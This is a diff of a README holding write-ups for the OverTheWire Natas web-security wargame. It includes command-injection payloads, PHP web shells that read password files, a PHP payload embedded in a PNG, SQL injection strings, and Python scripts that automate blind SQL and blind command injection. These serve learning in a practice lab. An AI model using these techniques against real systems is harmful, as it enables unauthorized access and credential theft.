@@ -1,8 +1,14 @@
 
 
+
 # OverTheWire Natas Solutions
 
-This is a collection of solution for the [OverTheWire Natas](https://overthewire.org/wargames/natas/) problems, a collection of 33 levels, each dealing with the basics of web security. All of the levels are found at http://natasX.natas.labs.overthewire.org, where X is the level number. <br>
+![Code](https://img.shields.io/badge/Code-Markdown-orange?logo=markdown) ![Coverage](https://img.shields.io/badge/Coverage-50%-yellow) ![Status](https://img.shields.io/badge/Status-In_production-green)
+
+This is a collection of solution for the [OverTheWire Natas](https://overthewire.org/wargames/natas/) problems, a collection of 34 levels, each dealing with the basics of web security. All of the levels are found at http://natasX.natas.labs.overthewire.org, where X is the level number. To access each challenge, we need a:
+- Username: `natasX`, where X is the level number.
+- Password: a 32 character long ASCII characters (uppercase `A-Z` and lowercase`a-z`) and numbers `0-9` word.
+
 Please use these as hints to solve the challenges yourself. Do not use them to cheat and not learn...
 > "With borrowed power, you'll never walk the path of the almighty."
 <br>\- Cid Kagenou, ["The Eminence in Shadow"](https://shadow-garden.jp/), Daisuke Aizawa
@@ -23,10 +29,12 @@ Please use these as hints to solve the challenges yourself. Do not use them to c
 - [Level 12](#level12) 
 - [Level 13](#level13) 
 - [Level 14](#level14) 
-- [Level 15](#level15) 
+- [Level 15](#level15)
+- [Level 16](#level16)
+- [Final Notes](#finalnotes)
 
 ## Level 0 <a name="level0"></a>
-Level 0 is pretty straight-foward. After logging into the level using the password `natas0`, we get the following screen:
+Level 0 is pretty straight-forward. After logging into the level using the password `natas0`, we get the following screen:
 
 ![Level 0](/imgs/lvl0/screenshot.png)
 
@@ -322,14 +330,14 @@ function encodeSecret($secret) {
 }
 ```
 What the level requires us to do, is a little reverse engineering of the algorithm that encodes the secret. Now that we know what it does, using the inverse logic, we can reverse the process of encoding to get the original string it was used to encode the secret. <br> 
-Let's create a PHP file (or use an online editor like [this one](https://www.programiz.com/php/online-compiler/)) to undo the encoding. Simply, we need to do the opposite of the algorithm:
+Let's create a PHP file (or use an online editor) to undo the encoding. Simply, we need to do the opposite of the algorithm:
 ```php
 function encodeSecret($secret) {
-    return a base64 decode... 
+    return a base64 decoded string... 
        ↓       ↓
     return base64_decode(strrev(hex2bin($secret)));
                       ↑               ↑   
-       ...Of the inverse string of a hexadecimal-to-binary string
+       ...Of the inverse of a hexadecimal-to-binary string
 }
 ```
 And feeding into the function the `$encodedSecret`, we get the `$decodedSecret = "oubWYf2kBq"`. <br>
@@ -374,15 +382,15 @@ if($key != "") {
 }
 ?>
 ```
-Looking closer, we see the key is not sanitized in any way, thus we can exploit this weakness and use it to our advantage in an XSS attack to gain information about the password. The biggest problem, though, is the [`grep`](https://en.wikipedia.org/wiki/Grep) command, which we need to escape from. <br>
-Looking at the [`man`](https://en.wikipedia.org/wiki/Man_page) pages for it, we see that running the `--help` flag will print out, and then exit. Exactly what we need to execute remote Shell commands on the server. Let's try it: we'll create a payload like this one, and see what happens to the output... <br>
+Looking closer, we see the key is not sanitized in any way, thus we can exploit this weakness and use it to our advantage in an [XSS](https://cwe.mitre.org/data/definitions/79.html) attack to gain information about the password. The biggest problem, though, is the [`grep`](https://en.wikipedia.org/wiki/Grep) command, which we need to escape from. <br>
+Looking at the [`man`](https://en.wikipedia.org/wiki/Man_page) pages for it, we see that running it with the `--help` flag will print out, and then exit. Let's try it: we'll create a payload like this one, and see what happens to the output... <br>
 Payload: `--help && pwd # `&emsp;← Beware of the final space, it's necessary or it won't work
 
 Output:
 
 [Output](/imgs/lvl9/output.png)
 
-And so, we know we're in `/var/www/natas/natas9` and can now freely navigate around the folders inside the server. If one read the rules closely, we know that:
+And so, we know we're in `/var/www/natas/natas9` and can now freely navigate around the folders inside the server. If one read the rules closely, we know that[^2]:
 > All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.
 
 Thus we need to get to `/etc/natas_webpass/natas10` and we'll have our password. Using the same structure as [Level 7](#level7), we can access it, and retrieve the secret hid in plain sight at the last line: <br>
@@ -621,9 +629,9 @@ Choose a JPEG to upload (max 1KB):<br/>
 <?php } ?>
 ```
 Focusing too much on decrypting the random name generator is just wasting time. But if one looks closer, we see we have no restriction on what we can send as file. <br>
-This immediately rings a bell, as this is a simple [web shell attack](https://en.wikipedia.org/wiki/Web_shell), where we upload a file with malicious code, that'll run on the server-side of the web app. Let's try it right away... We're going to create a file (since the server runs PHP commands, it's a PHP script) that'll print us something to make sure we can execute code:
+This immediately rings a bell, as this is a simple [Web Shell attack](https://cwe.mitre.org/data/definitions/434.html) , where we upload a file with malicious code, that'll run on the server-side of the web app. Let's try it right away... We're going to create a file (since the server runs PHP commands, it's a PHP script) that'll print us something to make sure we can execute code:
 `shell.php`
-```
+```php
 <?php 
 	$output = shell_exec('pwd');  
 	echo $output;
@@ -642,6 +650,7 @@ There are two hidden input fields, that actually display vital information we ca
 While we don't care about the size, we can manipulate the files name via the input field. That's great news since that's what we wanted. Now let's change the file type to `.php` and see what the site responds once we check it out. If all went correctly, it should display the current working directory: 
 ![pwd](/imgs/lvl12/pwd.png)
 And in fact it does! That's great news. Now we can use this to our advantage to get the next level's password by navigating the web server just like how we did in [Level 7](#level7), [Level 9](#level9) and [Level 10](#level10). Modifying the `shell.php` script to move to the solution path is relatively easy (after some trial and error):
+[`shell.php`](/scripts/lvl12/shell.php)
 ```php
 <?php 
 	$output = shell_exec('cat ../../../../../etc/natas_webpass/natas13');  
@@ -748,6 +757,7 @@ Ignoring the gibberish in the top, we see our path is `/var/www/natas/natas13/up
 echo '<?php $output = shell_exec("cat /../../../etc/natas_webpass/natas14"); echo $output; ?>' >> shell.png
 # ...
 ```
+Simply reuploading [`shell.php`](/scripts/lvl13/shell.php) and clicking it, we can see the password. 
 
 ## Level 14 <a name="level14"></a>
 Landing on the site, we see this:
@@ -783,7 +793,7 @@ Password: <input name="password"><br>
 <?php } ?>
 ```
 Seems like we're working with [MySQL](https://www.mysql.com/), an open source database for storing information in tables. It would be easy for us to see the information stored, but we can't since it's hosted on the server-side. Or can we? <br>
-Working with SQL, it's impossible not to think about [SQL Injection](https://wikipedia.org/wiki/SQL_injection), a common attack done to extract username, passwords and log in without brute force. Here, we see in the source code the `username` is not sanitized, and thus we can send a payload to log us in no matter what. The easiest one will work perfectly for this case: `" OR 1 = 1 # `. Simply, it'll always return true, and we can bypass the check `if(mysqli_num_rows(mysqli_query($link, $query)) > 0)` (it becomes `if(true > 0)` which is true):
+Working with SQL, it's impossible not to think about [SQL Injection](https://cwe.mitre.org/data/definitions/89.html), a common attack done to extract username, passwords and log in without brute force. Here, we see in the source code the `username` is not sanitized, and thus we can send a payload to log us in no matter what. The easiest one will work perfectly for this case: `" OR 1 = 1 # `. Simply, it'll always return true, and we can bypass the check `if(mysqli_num_rows(mysqli_query($link, $query)) > 0)` (it becomes `if(true > 0)` which is true):
 ```html
 <html>
 	<head>
@@ -848,22 +858,20 @@ Whenever we send a username, the code checks for its existence in the table `use
 This is an example of [Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind), where:
 > Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
 
-Simply testing which possible name we have for the next challenge is easy: `natas16` is a valid username. Now we need to extract information of the password. Let's use the input field to search for a possible password, and let's break down what's happening:
+Simply testing which possible name we have for the next challenge is easy: `natas16` is a valid username. Now we need to extract information of the password. Based on the existence or not of an user, we can determine if it has a certain password or not by just asking if it exists. Let's use the input field to search for a possible password:
 ```sql
-natas16" AND substring(password,1,2) = 'a' -- 
-
+natas16" AND BINARY substring(password,1,1) = 'a' -- 
 ```
-It simply means _search for the username "natas16" and that it has for password as first character "a"_ where [substring()](https://www.php.net/manual/en/function.substr.php?ref=learnhacking.io) will help us crack the password character per character.
-<br>
-Now, we could brute force the password doing by hand, but knowing it's 32 characters long, it takes quite a while. Let's write a script that'll automatically do it for us:
-`blind-sql.py`
+Let's break down what's happening: `natas16 "` is added to the query, `AND` concatenates commands, `BINARY` converts it to a binary value to get case-sensitivity (since in SQL `"HELLO" == "hello"` but `BINARY "HELLO" != "hello"`)and [`substring(string s, int beginning, int end)`](https://www.php.net/manual/en/function.substr.php) returns a section of the string `s` from `beginning` to `end`, and we compare it with a random character. If it does, it returns true, otherwise false. All and all, this payload simply means _search for the username "natas16" and if it has first character in the password an  "a"_. <br>
+Now, we could brute force the password doing by hand, changing character if it returns false, or append it if it's true, but knowing it's 32 characters long string of random characters and numbers, it takes quite a while. Let's write a script that'll automatically do it for us:
+[`blind-sql.py`](/scripts/lvl15/blind-sql.py)
 ```python
 import string       # For password generation
 import requests     # For http requests
 from requests.auth import HTTPBasicAuth
 
 # Basic htpp request variables
-login = HTTPBasicAuth("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
+login = HTTPBasicAuth("natas15", "****")	# Username and password
 headers = {"Content-Type": "application/x-www-form-urlencoded"}
 url = "http://natas15.natas.labs.overthewire.org/"
 
@@ -878,7 +886,7 @@ while count <= max_lenght:
     # ... for each valid character (numbers, lowercase and uppercase)
     for c in valid_characters:
         # Our payload
-        payload = "natas16\" AND substring(password, 1, " + str(count) + ") = \"" + password + c + "\" -- "
+        payload = "natas16\" AND BINARY substring(password, 1, " + str(count) + ") = \"" + password + c + "\" -- "
         response = requests.post(url, data = {"username": payload}, headers = headers, auth = login, verify = False)
         # We got a hit
         if "This user exists." in response.text:
@@ -895,12 +903,173 @@ Landing on the site, we see this:
 
 ![Level 16](/imgs/lvl16/screenshot.png)
 
+Seems like we're back to [Level 10](#level10). but we have some more characters we can't use...
+```php
+<?  
+$key = "";  
+  
+if(array_key_exists("needle", $_REQUEST)) {  
+	$key = $_REQUEST["needle"];  
+}  
+  
+if($key != "") {  
+	if(preg_match('/[;|&`\'"]/',$key)) {  
+		print "Input contains an illegal character!";  
+	} else {  
+		passthru("grep -i \"$key\" dictionary.txt");  
+	}  
+}  
+?>
+```
+We can't use `/ [ ; | & ' " ] /`, which means we can't escape from `grep`. So to get the solution, we need to run code, inside code. <br>
+We can do that thanks to [Command substitution](https://en.wikipedia.org/wiki/Command_substitution):
+> Command substitution is a facility that allows a command to be run and its output to be pasted back on the command line as arguments to another command.
+
+This neat feature is done usually by using backquotes as delimiters, but they're sanitized out of our input. Another common way to do that is using `$(...)`, where we can input our code inside of the parenthesis to be run.  To retrieve the password, we could just do `$(cat ../../../../etc/natas_webpass/natas17)` , but what would happen is it gets fed into `grep` due to command substitution, which then would be run as `grep -i "$(cat ../../../../etc/natas_webpass/natas17)" dictionary.txt` $\Rightarrow$ `grep -i "{password}" dictionary.txt` and then return nothing since it definitely doesn't exists there. We need to circumvent the search inside the file and retrieve the password. <br>
+It's oddly similar to the previous challenge, a [Blind OS Command Injection](https://portswigger.net/web-security/os-command-injection#blind-os-command-injection-vulnerabilities) where we can reconstruct the password by asking information to the server and then analyzing the answers it gives us. In this case, we can go character-by-character and ask if it exists where the solution is stored. If it does, we append a random word, and the command becomes `grep -i "{password}injection" dictionary.txt`. We need to do that since 
+- If the character doesn't exist, `grep -i "{}injection" dictionary.txt` does find "injection" in the dictionary.
+- If it does exist, it searches `grep -i "{character}injection" dictionary.txt`, which is an impossible word and thus doesn't display anything. 
+
+We can use this to our advantage and scan when we get a response or not. To get a single character from a file, we can use `grep` inside itself, and the payload will look something like: `$(grep {character} ../../../../etc/natas_webpass/natas17)injection`<br>
+We can repurpose the previous Python script to run on this site:
+[`blind-command.py`](/scripts/lvl16/blind-command.py)
+```python
+import string       # For password generation
+import requests     # For http requests
+from requests.auth import HTTPBasicAuth
+
+# Basic htpp request variables
+login = HTTPBasicAuth("natas16", "****") # Username and password
+url = "http://natas16.natas.labs.overthewire.org/"
+
+# Password generator
+valid_characters = string.digits + string.ascii_letters
+present_characters = ""
+
+# For all of the characters in the possible list
+for c in valid_characters:
+        # Our payload
+        payload = "$(grep " + c + " /etc/natas_webpass/natas17)injection"
+        # We need to modify the URL with our payload
+        new_url = url + "?needle=" + payload + "&submit=Search"
+        response = requests.get(new_url, auth = login, verify = False)
+        # We got a hit
+        if "injection" not in response.text:
+            print("Found: " + c)
+            present_characters += c
+
+print("Found following characters: " + present_characters)
+```
+Doing so, we found all of the possible characters present in the password, but they aren't in order. To do so, we'd need to know where the password starts or ends. `grep` has a nice trick up its sleeve to do so: if we start a word with the character `^` (which represents the beginning of a line), we can reconstruct it from there. So, let's fix the code and get the password:
+[`better-blind-command.py`](/scripts/lvl16/better-blind-command.py)
+```python
+import string       # For password generation
+import requests     # For http requests
+from requests.auth import HTTPBasicAuth
+
+# Basic htpp request variables
+login = HTTPBasicAuth("natas16", "****") # Username and password
+url = "http://natas16.natas.labs.overthewire.org/"
+
+# Password generator
+valid_characters = string.digits + string.ascii_letters
+present_characters = ""
+password = ""
+max_length = 32
+count = 0;
+
+# For all of the characters in the possible list
+for c in valid_characters:
+        # Our payload
+        payload = "$(grep " + c + " /etc/natas_webpass/natas17)injection"
+        # We need to modify the URL with our payload
+        new_url = url + "?needle=" + payload + "&submit=Search"
+        response = requests.get(new_url, auth = login, verify = False)
+        # We got a hit
+        if "injection" not in response.text:
+            print("Found: " + c)
+            present_characters += c
+
+print("Found following characters: " + present_characters + "\nStarting to reconstruct password...")
+
+while count <= max_length:
+    for c in present_characters:
+        # Our new payload
+        payload = "$(grep ^" + password + c + " /etc/natas_webpass/natas17)injection"
+        # We need to modify the URL with our new payload
+        new_url = url + "?needle=" + payload + "&submit=Search"
+        response = requests.get(new_url, auth = login, verify = False)
+        # We got a hit
+        if "injection" not in response.text:
+            print("Found: " + password + c)
+            password += c
+            count += 1
+
+print("Password: " + password)
+```
+
+## Level 17 <a name="level17"></a>
+Landing on the site, we see this:
+
+![Level 17](/imgs/lvl17/screenshot.png)
+
+Again we have some kind of username check, but this time done in SQL:
+```php
+<?php  
+  
+/*  
+CREATE TABLE `users` (  
+`username` varchar(64) DEFAULT NULL,  
+`password` varchar(64) DEFAULT NULL  
+);  
+*/  
+  
+if(array_key_exists("username", $_REQUEST)) {  
+	$link = mysqli_connect('localhost', 'natas17', '<censored>');  
+	mysqli_select_db($link, 'natas17');  
+  
+	$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";  
+	if(array_key_exists("debug", $_GET)) {  
+		echo "Executing query: $query<br>";  
+	}  
+  
+	$res = mysqli_query($link, $query);  
+	if($res) {  
+		if(mysqli_num_rows($res) > 0) {  
+			//echo "This user exists.<br>";  
+		} else {  
+			//echo "This user doesn't exist.<br>";  
+		}  
+	} else {  
+		//echo "Error in query.<br>";  
+	}  
+  
+	mysqli_close($link);  
+} else {  
+?>  
+  
+<form action="index.php" method="POST">  
+Username: <input name="username"><br>  
+<input type="submit" value="Check existence" />  
+</form>  
+<?php } ?>
+```
+
+## Final Notes <a name="finalnotes"></a>
+This project is under the [GPL-3.0 License](https://www.gnu.org/licenses/gpl-3.0.html). Any use or distribution is completely free, unless edited. <br>
+[OverTheWire Natas](https://overthewire.org/wargames/natas/), its challenges and solutions are all under their domain. I claim nothing. If you liked the challenges, please consider [donating](https://overthewire.org/information/donate.html) to them. <br>
+Huge thanks to [CWE](https://cwe.mitre.org/index.html) for explanations and code examples. Check it out. <br>
+Main contributors:
+- Owner: [Unpwnabl](https://github.com/unpwnabl)
+
+---
 
 [^1]: I'll be using FireFox, so DevTools and some shortcuts are different from one another, although they're mostly similar in functionality.
 [^2]: It's also written in the [main page](https://overthewire.org/wargames/natas/) of the web challenges, if one doesn't want to use hints.
 [^3]: \- `convert` is part of [ImageMagick](https://github.com/ImageMagick/ImageMagick), necessary to have a smaller image (9x9 is a arbitrary dimension I chose). <br>
 \- `>>` redirect stdout to file. <br>
-\- Thanks to [Synactivy](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)  for some of the commands and explanations.
+\- Thanks to [Synactivy](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)  for the explanation and some commands.
+
 
 
 
